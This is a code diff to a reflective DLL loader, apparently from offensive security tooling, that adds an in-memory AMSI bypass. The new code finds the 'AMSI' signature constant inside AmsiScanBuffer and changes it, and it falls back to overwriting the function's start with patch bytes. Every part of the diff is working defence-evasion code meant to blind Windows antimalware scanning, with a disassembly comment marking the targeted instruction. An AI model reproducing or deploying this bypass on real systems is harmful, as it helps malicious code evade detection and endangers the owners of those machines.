@@ -492,16 +492,43 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 
             if (pAmsiScanBuffer != NULL) {
 
+                BOOL patched = FALSE;
                 DWORD oldProt = 0, temp = 0;
-                if (pVirtualProtect(pAmsiScanBuffer, AMSISCANBUFFER_PATCH_SIZE, PAGE_EXECUTE_READWRITE, &oldProt))
-                {
-                    const char buf[] = AMSISCANBUFFER_PATCH_BYTES;
-                    for (unsigned int i = 0; i < AMSISCANBUFFER_PATCH_SIZE; i++)
-                    {
-                        ((char*)pAmsiScanBuffer)[i] = buf[i];
-                    }
 
-                    pVirtualProtect(pAmsiScanBuffer, AMSISCANBUFFER_PATCH_SIZE, oldProt, &temp);
+                // Strategy1: Look for `AMSI` constant DWORD used in the code of AmsiScanBuffer:
+                //      AmsiScanBuffer+76:
+                //      .text:0000000180003656 74 5D                jz      short loc_1800036B5
+                //      .text:0000000180003658 48 85 DB             test    rbx, rbx
+                //      .text:000000018000365B 74 58                jz      short loc_1800036B5
+                //      .text:000000018000365D 81 3B 41 4D 53 49    cmp     dword ptr [rbx], 'ISMA'   <====
+                //      .text:0000000180003663 75 50                jnz     short loc_1800036B5
+                //      .text:0000000180003665 48 8B 43 08          mov     rax, [rbx+8]
+
+                for(unsigned int i = 0; i < 300; i++) {
+                    _PHAMSICONTEXT ctx = (_PHAMSICONTEXT)&((char*)pAmsiScanBuffer)[i];
+
+                    if(ctx->Signature == 0x49534D41) {
+                        if (pVirtualProtect(pAmsiScanBuffer, sizeof(ULONG_PTR), PAGE_EXECUTE_READWRITE, &oldProt))
+                        {
+                            // change signature
+                            ctx->Signature++;
+                            pVirtualProtect(pAmsiScanBuffer, sizeof(ULONG_PTR), oldProt, &temp);
+                            patched = TRUE;
+                        }
+                    }
+                }
+
+                if(!patched) {
+                    if (pVirtualProtect(pAmsiScanBuffer, AMSISCANBUFFER_PATCH_SIZE, PAGE_EXECUTE_READWRITE, &oldProt))
+                    {
+                        const char buf[] = AMSISCANBUFFER_PATCH_BYTES;
+                        for (unsigned int i = 0; i < AMSISCANBUFFER_PATCH_SIZE; i++)
+                        {
+                            ((char*)pAmsiScanBuffer)[i] = buf[i];
+                        }
+
+                        pVirtualProtect(pAmsiScanBuffer, AMSISCANBUFFER_PATCH_SIZE, oldProt, &temp);
+                    }
                 }
             }
         }
